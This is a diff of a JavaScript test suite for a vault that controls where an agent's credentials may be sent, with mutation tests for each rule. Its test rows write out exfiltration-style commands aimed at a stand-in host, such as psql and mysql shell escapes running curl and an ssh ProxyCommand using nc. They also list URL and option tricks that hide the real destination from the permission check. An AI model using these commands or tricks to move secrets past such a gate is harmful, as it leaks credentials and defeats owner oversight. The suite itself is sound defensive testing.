@@ -15,7 +15,11 @@
 //      9 216-cell grid vs a reference (lane vault-run-door: + the design's «shape seen?» — a local instance asks a NEW shape)
 //   ⑤b THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」) — whose an agent entry is
 //      (its registered id or its durable one; a pending fork borrows nothing); the verdict rows: own stored ⇒ ok:own on a
-//      cluster and a local instance, a shell too (no card); own minted to its --for host / a host under it / no host ⇒ ok:own;
+//      cluster and a local instance, a shell too (no card); own minted to its --for host / a host under it ⇒ ok:own (round 2:
+//      a known tool naming no host it can READ asks — `psql`, `PGSERVICE=…`, `rclone remote:`; a host written without a scheme,
+//      in `host=`, attached `-hHOST`, a URI's host list, gh `--hostname` is READ and asks as another host; a glob / a bare
+//      number / `--unix-socket` / git's project config ⇒ blind; a blind shape asks EVERY run on a cluster, once per shape on a
+//      local instance, a live «always» passes it; jq is still refused by name);
 //      to another host ⇒ ask once/deny (why another-host, the card's two hosts), a pass per entry × host; no --for / a dotless
 //      one / a lookalike ⇒ another host; the owner's entry and a mix ⇒ today's road (why not-own; «always» and «seen» never
 //      pass a host); the plan's refusals, the lock and the 8-byte floor still first
@@ -31,7 +35,9 @@
 //      a value split across chunks escaping; lane vault-scrub-forms: each NEW form dropped (utf16, base32, qp, escape, entity,
 //      ansi, wrap), a view's held tail ignored, a backslash run held whole; lane vault-agent-own: an own stored entry asks, an
 //      own entry needs the switch, a minted value's host never matches, a minted value goes anywhere, another conversation owns
-//      it, a pending fork borrows its parent's id, a lookalike host passes, a seen shape passes the host
+//      it, a pending fork borrows its parent's id, a lookalike host passes, a seen shape passes the host; round 2: a known tool
+//      naming no host it can read passes, a cluster keeps a blind shape after one plain 允许, a scheme-less target / `host=` / an
+//      attached short flag / a URI's host list is not read, a client's shell escape (psql -c '\!', mysql -e 'system') is not seen
 import fs from 'node:fs';
 import path from 'node:path';
 import crypto from 'node:crypto';
@@ -333,7 +339,95 @@ function ownRoad(Vm) {
   const pTo = P(['curl', 'https://api.example.com/v1']), pSub = P(['curl', 'https://eu.api.example.com']), pNone = P(['psql']), pAway = P(['curl', 'https://elsewhere.example.org']);
   say('own minted to its host', sum(verdict(pTo, fact(pTo, minted('api.example.com')))), 'ok:own');
   say('own minted to a host under it (--for a URL)', sum(verdict(pSub, fact(pSub, minted('https://api.example.com/login')))), 'ok:own');
-  say('own minted to no host (a local command)', sum(verdict(pNone, fact(pNone, minted('api.example.com')))), 'ok:own');
+  // ROUND 2: every row of the table reaches the network — a known tool naming no host it can READ is not «no host»
+  say('own minted · a known tool naming no host it can read (psql) ⇒ asks', sum(verdict(pNone, fact(pNone, minted('api.example.com')))), 'ask:once,deny:another-host');
+  const R2 = (argv, env = []) => Vm.planOf({ argv, env: [['T0', OWN], ...env] });
+  const r2 = (p, forHost = 'api.example.com', o = {}) => { const v = verdict(p, fact(p, minted(forHost)), o); return `${sum(v)}${(v.away || []).length ? ' @' + v.away.map((a) => a.host || '?').join(',') : ''}`; };
+  const R2b = (argv, env = []) => Vm.planOf({ argv, env: [['T0', OWN], ...env] });
+  for (const [name, p, want] of [
+    // the five shapes of the round-2 brief: a host the table did not read
+    ['curl evil.example.com (no scheme)', R2(['curl', 'evil.example.com']), 'ask:once,deny:another-host @evil.example.com'],
+    ['psql "host=evil.example.com …" (a connection string)', R2(['psql', 'host=evil.example.com dbname=app']), 'ask:once,deny:another-host @evil.example.com'],
+    ['psql -hevil.example.com (attached)', R2(['psql', '-hevil.example.com']), 'ask:once,deny:another-host @evil.example.com'],
+    ['PGSERVICE=… psql (a service file names the host)', R2(['psql', '-c', 'select 1'], [['PGSERVICE', 'evil']]), 'ask:once,deny:another-host @?'],
+    ['rclone copy x remote: (the remote\'s config names it)', R2(['rclone', 'copy', 'x', 'remote:']), 'ask:once,deny:another-host @?'],
+    // MIXED: one host read, the tool still goes to another
+    ['curl https://api… evil.example.com', R2(['curl', 'https://api.example.com/v1', 'evil.example.com']), 'ask:once,deny:another-host @evil.example.com'],
+    ['psql -h api… "host=evil…"', R2(['psql', '-h', 'api.example.com', 'host=evil.example.com']), 'ask:once,deny:another-host @evil.example.com'],
+    ['psql postgresql://api…:1,evil…/db (a host LIST)', R2(['psql', 'postgresql://api.example.com:1,evil.example.com/db']), 'ask:once,deny:another-host @evil.example.com'],
+    ['psql "…?host=evil…" (a URI\'s query)', R2(['psql', 'postgresql://api.example.com/db?host=evil.example.com']), 'ask:once,deny:another-host @evil.example.com'],
+    ['PGHOST=api…,evil… (a host list)', R2(['psql'], [['PGHOST', 'api.example.com,evil.example.com']]), 'ask:once,deny:another-host @evil.example.com'],
+    ['http POST evil.example.com/x (httpie, no scheme)', R2(['http', 'POST', 'evil.example.com/x', 'a=1']), 'ask:once,deny:another-host @evil.example.com'],
+    ['gh api --hostname evil…', R2(['gh', 'api', '--hostname', 'evil.example.com', '/user']), 'ask:once,deny:another-host @evil.example.com'],
+    ['gh repo clone evil…/o/r (drives git ⇒ blind)', R2(['gh', 'repo', 'clone', 'evil.example.com/o/r']), 'ask:once,deny:another-host @?'],
+    // BLIND: a target the shape cannot list, a routing flag however spelled, a destination a config keeps
+    ['curl https://api…/{a,b} (a glob)', R2(['curl', 'https://api.example.com/{a,b}']), 'ask:once,deny:another-host @?'],
+    ['curl https://api… 2130706433 (a bare number is an address)', R2(['curl', 'https://api.example.com', '2130706433']), 'ask:once,deny:another-host @?'],
+    ['curl --unix-socket … https://api…', R2(['curl', '--unix-socket', '/tmp/s', 'https://api.example.com']), 'ask:once,always,deny:another-host @?'],
+    ['curl --expand-url https://{{H}}/', R2(['curl', '--expand-url', 'https://{{H}}/'], [['H', 'evil.example.com']]), 'ask:once,deny:another-host @?'],
+    ['ssh -oProxyCommand=… api… (attached)', R2(['ssh', '-oProxyCommand=nc evil.example.com 22', 'api.example.com']), 'ask:once,always,deny:another-host @?'],
+    ['git push https://api…/x.git (the project\'s .git/config may rewrite it)', R2(['git', 'push', 'https://api.example.com/x.git']), 'ask:once,always,deny:another-host @?'],
+    ['wget -i urls.txt', R2(['wget', '-i', 'urls.txt']), 'ask:once,deny:another-host @?'],
+    ['wget -e use_proxy=on … https://api…', R2(['wget', '-e', 'use_proxy=on', 'https://api.example.com']), 'ask:once,always,deny:another-host @?'],
+    ['kubectl get pods (its kubeconfig names the server)', R2(['kubectl', 'get', 'pods']), 'ask:once,deny:another-host @?'],
+    ['kubectl --server evil…:6443 (no scheme)', R2(['kubectl', '--server', 'evil.example.com:6443', 'get', 'pods']), 'ask:once,deny:another-host @evil.example.com:6443'],
+    // a client's SHELL ESCAPE — the value in its env goes wherever the shell sends it (an owner's «always» never covers it either)
+    ['psql -h api… -c \'\\! curl …\' (psql\'s shell)', R2(['psql', '-h', 'api.example.com', '-c', '\\! curl -d x evil.example.com']), 'ask:once,deny:another-host @?'],
+    ['psql -h api… -f m.sql (a file may hold one)', R2(['psql', '-h', 'api.example.com', '-f', 'm.sql']), 'ask:once,deny:another-host @?'],
+    ['mysql -h api… -e \'system …\'', R2(['mysql', '-h', 'api.example.com', '-e', 'system curl evil.example.com']), 'ask:once,deny:another-host @?'],
+    ['sftp -b batch api… (its !command)', R2(['sftp', '-b', 'b.txt', 'api.example.com']), 'ask:once,deny:another-host @?'],
+    ['kubectl -s https://api… ⇒ allowed', R2(['kubectl', '-s', 'https://api.example.com', 'get', 'pods']), 'ok:own'],
+    ['psql -h api… -c \'select 1\' ⇒ allowed', R2(['psql', '-h', 'api.example.com', '-c', 'select 1']), 'ok:own'],
+    ['mysql -h api… -e \'select 1\' ⇒ allowed', R2(['mysql', '-h', 'api.example.com', '-e', 'select 1']), 'ok:own'],
+    // ALLOWED: its own host, however the tool spells it; a value flag is never read as a target
+    ['curl https://api…/ ⇒ allowed', R2(['curl', 'https://api.example.com/']), 'ok:own'],
+    ['curl api.example.com/v1 (no scheme) ⇒ allowed', R2(['curl', 'api.example.com/v1']), 'ok:own'],
+    ['curl -sS -X POST -H … -o out.json https://api… ⇒ allowed', R2(['curl', '-sS', '-X', 'POST', '-H', 'X-A: 1', '-o', 'out.json', 'https://api.example.com/v1']), 'ok:own'],
+    ['curl -sSo out.json https://api… (a clustered value flag) ⇒ allowed', R2(['curl', '-sSo', 'out.json', 'https://api.example.com/v1']), 'ok:own'],
+    ['http POST api…/v1 a=1 ⇒ allowed', R2(['http', 'POST', 'api.example.com/v1', 'a=1', 'X-A:1']), 'ok:own'],
+    ['psql -h api… ⇒ allowed', R2(['psql', '-h', 'api.example.com']), 'ok:own'],
+    ['psql -hapi… ⇒ allowed', R2(['psql', '-hapi.example.com']), 'ok:own'],
+    ['psql "host=api… dbname=app" ⇒ allowed', R2(['psql', 'host=api.example.com dbname=app']), 'ok:own'],
+  ]) say(`own minted · ${name}`, r2(p), want);
+  say('own minted · gh api /user --for github.com (the table\'s own hosts) ⇒ allowed', r2(R2(['gh', 'api', '/user']), 'github.com'), 'ok:own');
+  say('PSQLRC (psql\'s startup file runs \\!) is refused by name', sum(verdict(R2(['psql', '-h', 'api.example.com'], [['PSQLRC', './rc']]), [])), 'env_refused');
+  const pEsc = P(['psql', '-h', 'api.example.com', '-c', '\\! curl -d x evil.example.com'], [M1]);
+  say('the owner\'s entry · a live «always» never covers a shell escape (psql -c \\!)', sum(verdict(pEsc, fact(pEsc, () => ({ open: true })), { remembered: { until: null } })), 'ask:once,deny:not-own');
+  // ROUND 2b (the parser review): a minted value --for good.com must never run with NO card where the REAL tool reaches elsewhere
+  for (const [name, p, want] of [
+    // HIGH-1: curl / wget percent-decode, IDNA-map, read userinfo past a `\` — URL_RE's host is not where they connect ⇒ blind
+    ['curl https://good.com%2eevil.com/ (percent)', R2b(['curl', 'https://good.com%2eevil.com/']), 'ask:once,deny:another-host @?'],
+    ['curl http://good.com\u3002evil.com/ (IDNA dot)', R2b(['curl', 'http://good.com\u3002evil.com/']), 'ask:once,deny:another-host @?'],
+    ['curl https://good.com\\@evil.com/ (backslash userinfo)', R2b(['curl', 'https://good.com\\@evil.com/']), 'ask:once,deny:another-host @?'],
+    ['wget https://good.com%00.evil.com/ (NUL)', R2b(['wget', 'https://good.com%00.evil.com/']), 'ask:once,deny:another-host @?'],
+    // HIGH-2: curl --url @file reads the real URLs from a file
+    ['curl --url @good.com (a file of URLs)', R2b(['curl', '--url', '@good.com']), 'ask:once,deny:another-host @?'],
+    ['curl --url=@good.com', R2b(['curl', '--url=@good.com']), 'ask:once,deny:another-host @?'],
+    // HIGH-3: wget long-option abbreviations (getopt_long takes any unique prefix)
+    ['wget --input-f=list.txt … (abbrev of --input-file)', R2b(['wget', '--input-f=list.txt', 'http://good.com/']), 'ask:once,deny:another-host @?'],
+    ['wget --conf=x.rc … (abbrev of --config)', R2b(['wget', '--conf=x.rc', 'http://good.com/']), 'ask:once,deny:another-host @?'],
+    ['wget --exec=http_proxy=… (abbrev of --execute)', R2b(['wget', '--exec=http_proxy=evil:3128', 'http://good.com/']), 'ask:once,always,deny:another-host @?'],
+    // HIGH-4: psql -o '|cmd' pipes to a shell; abbreviations; a -f file
+    ['psql -h good -o \'|curl …\' (output pipe)', R2b(['psql', '-h', 'good.com', '-o', '|curl evil.com -d @-']), 'ask:once,deny:another-host @?'],
+    ['psql -h good --comm=\'\\! …\' (abbrev meta)', R2b(['psql', '-h', 'good.com', '--comm=\\! curl x']), 'ask:once,deny:another-host @?'],
+    ['psql -h good --fil=x.sql (abbrev of --file)', R2b(['psql', '-h', 'good.com', '--fil=x.sql']), 'ask:once,deny:another-host @?'],
+    ['psql -h good --hos=evil (abbrev of --host, last wins)', R2b(['psql', '-h', 'good.com', '--hos=evil.com']), 'ask:once,deny:another-host @evil.com'],
+    // HIGH-5: gh -R HOST/OWNER/REPO where the host is an IP / a port / a trailing dot (gh sends GH_ENTERPRISE_TOKEN there)
+    ['gh -R 1.2.3.4/o/r (an IP host)', R2(['gh', '-R', '1.2.3.4/o/r', 'api', '/x']), 'ask:once,deny:another-host @1.2.3.4'],
+    ['gh -R evil:8443/o/r (a port host)', R2(['gh', '-R', 'evil:8443/o/r', 'api', '/x']), 'ask:once,deny:another-host @evil:8443'],
+    // HIGH-6: gh commands that drive git (hooks + the project's .git/config)
+    ['gh repo clone o/r -- --template=DIR', R2(['gh', 'repo', 'clone', 'o/r', '--', '--template=DIR']), 'ask:once,deny:another-host @?'],
+    ['gh pr checkout 123', R2(['gh', 'pr', 'checkout', '123']), 'ask:once,deny:another-host @?'],
+    // the fixes do not over-blind a clean command
+    ['kubectl -s=https://good.com (the = is dropped) ⇒ allowed', R2(['kubectl', '-s=https://good.com', 'get', 'pods']), 'ok:own'],
+    ['psql -dhost=good.com (a conninfo in -d) ⇒ allowed', R2(['psql', '-dhost=good.com']), 'ok:own'],
+    ['psql -h good -o out.txt (a file, not a pipe) ⇒ allowed', R2b(['psql', '-h', 'good.com', '-o', 'out.txt']), 'ok:own'],
+    ['gh -R github.com/o/r ⇒ allowed', R2b(['gh', '-R', 'github.com/o/r', 'api', '/x']), 'ok:own'],
+    ['curl https://u:p@good.com/ (clean userinfo) ⇒ allowed', R2(['curl', 'https://u:p@good.com/']), 'ok:own'],
+    ['curl https://good.com/a%20b (percent in the PATH) ⇒ allowed', R2b(['curl', 'https://good.com/a%20b']), 'ok:own'],
+  ]) say(`own minted · ${name}`, r2(p, name.endsWith('github.com/o/r ⇒ allowed') ? 'github.com' : 'good.com'), want.startsWith('ok') ? 'ok:own' : want);
+  say('gh -R IP / port ⇒ allowed to its OWN for-host (github route unused)', r2(R2(['gh', '-R', '1.2.3.4/o/r', 'api', '/x']), '1.2.3.4'), 'ok:own');
+  say('own minted · jq … $VAULT_FILE{…} — still refused by name (a local tool that reads it prints it)', sum(verdict(Vm.planOf({ argv: ['jq', '.', '$VAULT_FILE{T}'], file: [['T', OWN]] }), [])), 'tool_prints_secrets');
   const va = verdict(pAway, fact(pAway, minted('api.example.com')));
   say('own minted to another host ⇒ asks (once / deny)', sum(va), 'ask:once,deny:another-host');
   say('…its card names both hosts', JSON.stringify((va.away || []).map((a) => [a.forHost, a.host])), JSON.stringify([['api.example.com', 'elsewhere.example.org']]));
@@ -348,15 +442,24 @@ function ownRoad(Vm) {
   // naming its host (its own code decides), a config file, a routing flag, the project's own code, an unknown tool, a program
   // an agent could have written; a backslash never hides the host (`https://evil\@good/` goes to evil)
   const blind = [['a shell naming its host', ['bash', '-c', 'curl https://api.example.com']], ['an interpreter naming no host', ['python3', 'x.py']], ['curl -K (a config file)', ['curl', '-K', 'c.cfg', 'https://api.example.com']],
-    ['a routing flag (ssh -o)', ['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com']], ['the project\'s own code (npm)', ['npm', 'install']], ['a tool outside the table', ['mytool', '--to', 'api.example.com']]];
-  for (const [name, argv] of blind) { const pb = P(argv); say(`own minted · ${name} ⇒ asks`, sum(verdict(pb, fact(pb, minted('api.example.com')))), 'ask:once,deny:another-host'); }
+    ['a routing flag (ssh -o)', ['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com'], 'ask:once,always,deny:another-host'], ['the project\'s own code (npm)', ['npm', 'install']], ['a tool outside the table', ['mytool', '--to', 'api.example.com']]];
+  for (const [name, argv, want = 'ask:once,deny:another-host'] of blind) { const pb = P(argv); say(`own minted · ${name} ⇒ asks`, sum(verdict(pb, fact(pb, minted('api.example.com')))), want); }
   const pw = Vm.planOf({ argv: ['psql'], env: [['T', OWN]], programWritable: true });
   say('own minted · a known tool an agent could have written ⇒ asks', sum(verdict(pw, fact(pw, minted('api.example.com')))), 'ask:once,deny:another-host');
   const pSh = P(['bash', '-c', 'curl https://api.example.com']), vSh = verdict(pSh, fact(pSh, minted('api.example.com')));
   say('…its card says the destination cannot be told', JSON.stringify((vSh.away || []).map((a) => [a.unknown, a.host])), JSON.stringify([[true, null]]));
-  say('…its pass is the SHAPE\'s: allowed once, the same command shape asks no more', sum(verdict(pSh, fact(pSh, minted('api.example.com')), { passes: (vSh.away || []).map((a) => ({ id: a.id, host: a.pass })) })), 'ok:own');
+  // ROUND 2 (the addendum): a LOCAL instance keeps the shape's pass after one 允许; a CLUSTER asks every run of a blind shape
+  const shPass = (vSh.away || []).map((a) => ({ id: a.id, host: a.pass })), vShL = verdict(pSh, fact(pSh, minted('api.example.com')), { instance: 'local' });
+  say('…on a cluster its 允许 is not kept', JSON.stringify([(vSh.away || []).map((a) => a.keep), (vShL.away || []).map((a) => a.keep)]), JSON.stringify([[false], [true]]));
+  say('…local: allowed once, the same command shape asks no more', sum(verdict(pSh, fact(pSh, minted('api.example.com')), { instance: 'local', passes: shPass })), 'ok:own');
+  say('…a CLUSTER asks every run of it (a pass never passes it there)', sum(verdict(pSh, fact(pSh, minted('api.example.com')), { passes: shPass })), 'ask:once,deny:another-host');
+  say('…a cluster with the owner\'s «ask» policy on a local instance too', sum(verdict(pSh, fact(pSh, minted('api.example.com')), { instance: 'local', policy: 'ask', passes: shPass })), 'ask:once,deny:another-host');
   const pSh2 = P(['bash', '-c', 'curl https://api.example.com/other']);
-  say('…another shell command is another shape and asks', sum(verdict(pSh2, fact(pSh2, minted('api.example.com')), { passes: (vSh.away || []).map((a) => ({ id: a.id, host: a.pass })) })), 'ask:once,deny:another-host');
+  say('…another shell command is another shape and asks', sum(verdict(pSh2, fact(pSh2, minted('api.example.com')), { instance: 'local', passes: shPass })), 'ask:once,deny:another-host');
+  const pKy = P(['ssh', '-o', 'ProxyCommand=nc x 22', 'api.example.com']), fKy = fact(pKy, minted('api.example.com'));
+  say('a blind shape «always» is offered for (a known tool naming its host) · a live «always» passes it on a cluster', sum(verdict(pKy, fKy, { remembered: { until: null } })), 'ok:always');
+  say('…an «always» that ended asks again', sum(verdict(pKy, fKy, { remembered: { until: NOW0 - 1 } })), 'ask:once,always,deny:another-host');
+  say('…the «always» never passes a HOST (a minted value to another host + a live «always»)', sum(verdict(pAway, fact(pAway, minted('api.example.com')), { remembered: { until: null } })), 'ask:once,deny:another-host');
   say('own STORED through a shell still asks nothing', sum(verdict(pSh, fact(pSh, () => ({ own: true, prov: 'stored' })))), 'ok:own');
   const pBs = P(['http', 'https://evil.example\\@api.example.com/x']);
   say('a backslash never hides the host (http https://evil\\@api…/ goes to evil)', sum(verdict(pBs, fact(pBs, minted('api.example.com')))), 'ask:once,deny:another-host');
@@ -389,7 +492,7 @@ function ownRoad(Vm) {
 }
 {
   const bad = ownRoad(V);
-  ok(!bad.length, 'the own road: whose (registered / durable id, a pending fork borrows nothing), own stored ⇒ ok:own everywhere (no card), own minted ⇒ ok:own to its host / under it / no host (a known tool) and ONCE per host elsewhere (both hosts on the card; a pass per entry × host), ONCE per command shape where the destination cannot be told (a shell, an interpreter, a config file, a routing flag, project code, an unknown or agent-writable program; a backslash hides no host), the owner\'s entry and a mix ⇒ today\'s road («always» / seen never pass a host), the lock / argv / the floor first', bad);
+  ok(!bad.length, 'the own road: whose (registered / durable id, a pending fork borrows nothing), own stored ⇒ ok:own everywhere (no card), own minted ⇒ ok:own to its host / under it and ONCE per host elsewhere (both hosts on the card; a pass per entry × host); where the destination cannot be told (a shell, an interpreter, a config file, a routing flag, project code, an unknown or agent-writable program, round 2: a known tool naming no host it can read; a backslash hides no host) ONCE per command shape locally and EVERY run on a cluster (a live «always» passes it); round 2: a host written without a scheme, in host=, attached, in a URI\'s list, gh --hostname is read, the owner\'s entry and a mix ⇒ today\'s road («always» / seen never pass a host), the lock / argv / the floor first', bad);
 }
 
 console.log('⑥ THE SCRUBBER — a value and its forms (FORMS: spelled and read), over ONE window per run');
@@ -630,16 +733,24 @@ console.log('⑧ MUTANTS — patched copies of src/vault-run.js must go RED');
     ['a backslash run held whole', 'k = j + 2 * Math.floor((k - j) / 2);', 'k = j;', (Vm) => { const m = Vm.createMasker(secretsOf(VALUES[0])), n = m.push('\\'.repeat(65536)).length; return n >= 65536 - 2 * m.window - 12 ? [] : [['held', n]]; }],
     ['a view\'s held tail ignored', 'if (!final) { const len = r ? r.sk.length : end, ss = len - W;', 'if (false) { const len = r ? r.sk.length : end, ss = len - W;', (Vm) => (Vm === V ? once('chunk', () => chunkEscapes(V)).filter(([, n]) => READ_ROWS.some(([r]) => r === n)) : chunkEscapes(Vm, READ_ROWS))],
     // lane vault-agent-own: each rule of the own road, broken in a copy ⇒ its rows RED
-    ['an own stored entry still asks', "  if (!why.length) return { ok: true, by: 'own' };\n", '\n', ownRoad],
+    ['an own stored entry still asks', "  if (!why.length) return { ok: true, by: away0.length ? 'always' : 'own' };\n", '\n', ownRoad],
     ['an own entry still needs the switch', 'if (e.open !== true && e.own !== true) return refuse(', 'if (e.open !== true) return refuse(', ownRoad],
     ['a minted value\'s own host never matches', '  if (!f || !h) return false;\n  if (h.startsWith', '  return false;\n  if (h.startsWith', ownRoad],
-    ['a minted value goes anywhere', '  const away = awayOf(plan.refs, facts, sh, passes);', '  const away = [];', ownRoad],
+    ['a minted value goes anywhere', "const away0 = awayOf(plan.refs, facts, sh, passes, { shapePasses: mode === 'allow' }), away = away0.filter((x) => !(x.unknown && live));", 'const away0 = [], away = [];', ownRoad],
     ['another conversation owns it', '  return !!sc && callerIdsOf(caller).includes(sc);', '  return !!sc;', ownRoad],
     ['a pending fork borrows its parent\'s id', '...(caller.conv !== undefined ? [caller.conv] : [caller.conversationId])', 'caller.conv, caller.conversationId', ownRoad],
     ['a lookalike host passes', "  return h === f || h.endsWith('.' + f);", '  return h === f || h.endsWith(f);', ownRoad],
     ['a seen shape passes the host', "  if (!away.length && mode === 'allow' && seen === true)", "  if (mode === 'allow' && seen === true)", ownRoad],
     ['a blind destination passes (the review)', "const destUnknown = (sh) => !sh || sh.blind !== false;", 'const destUnknown = () => false;', ownRoad],
-    ['a backslash hides the host (the review)', "(?:[^@\\s\\/\\\\?#'\"]{0,256}@)?", "(?:[^@\\s\\/?#'\"]{0,256}@)?", ownRoad],
+    ['a backslash hides the host (round 2b: blindAuthority)', '.some(blindAuthority)', '.some(() => false)', ownRoad],   // %2e / IDNA / userinfo-backslash authorities read as a trusted host
+    // round 2 (the brief's RED copies): today's «hosts = [] ⇒ allowed», a cluster remembering a blind shape — and each new read
+    ['a known tool naming no host it can read passes (round 2)', '|| !known || !hosts.size || unread ||', '|| !known || unread ||', ownRoad],
+    ['a cluster keeps a blind shape after one plain 允许 (round 2)', "{ shapePasses: mode === 'allow' }", '{ shapePasses: true }', ownRoad],
+    ['a target written without a scheme is not read (round 2)', 'if (t.host) hosts.add(t.host); if (t.unread) unread = true;', 'if (t.unread) unread = true;', ownRoad],
+    ['a connection string\'s host= is not read (round 2)', 'if (row.conninfo) for (const a of argv.slice(1))', 'if (false) for (const a of argv.slice(1))', ownRoad],
+    ['an attached short flag is not split (round 2)', "cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;", 'cl = null;', ownRoad],
+    ['a URI\'s host list is not read (round 2)', "for (const x of (m[4] || '').split(',').slice(1))", 'for (const x of [])', ownRoad],
+    ['a client\'s shell escape is not seen (round 2)', 'if (row.scriptFlags) for (const v of vals(row.scriptFlags))', 'if (false) for (const v of vals(row.scriptFlags))', ownRoad],
   ];
   for (const [name, from, to, leg] of LEGS) {
     const { hit, M } = mutant(name.replace(/\W+/g, '-'), from, to);
